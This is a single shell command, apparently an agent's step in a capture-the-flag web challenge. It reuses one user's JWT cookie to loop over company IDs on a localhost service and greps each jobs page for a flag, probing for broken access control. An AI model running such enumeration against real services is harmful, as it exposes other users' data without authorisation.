input.command:
TOKEN='Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzc3MDc1Njg4fQ.Aeg7-bg2Zst4qpY9Z2VTr41rcMJGN7j-AGMpSbuI-Ic'
for i in 0 2 3 4 5 6 7 8 9 10; do
  echo "=== Company $i ==="
  curl -s -b "access_token=\"$TOKEN\"" http://localhost:46647/company/$i/jobs | grep -E "(Job|FLAG|h2)" | head -20
done
